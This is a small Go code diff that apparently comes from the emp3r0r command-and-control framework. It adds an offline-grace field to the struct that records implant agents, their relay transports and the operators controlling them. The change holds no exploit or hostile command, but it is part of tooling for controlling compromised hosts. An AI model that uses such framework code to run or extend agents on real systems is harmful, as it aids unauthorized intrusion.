@@ -48,6 +48,7 @@ type Emp3r0rAgent struct {
 	GOArch         string        `cbor:"41,keyasint"` // runtime.GOARCH of the agent binary (not the OS kernel arch)
 	P2PTransport   string        `cbor:"42,keyasint"` // transport the agent's P2P relay listens on (kcp/mtls/smb)
 	Owner          string        `cbor:"43,keyasint"` // operator currently holding this agent, empty when free
+	OfflineGrace   int           `cbor:"44,keyasint"` // agent-chosen removal grace in seconds; 0 means remove immediately
 }
 
 // EnrichedPeer holds detailed peer information signed by C2
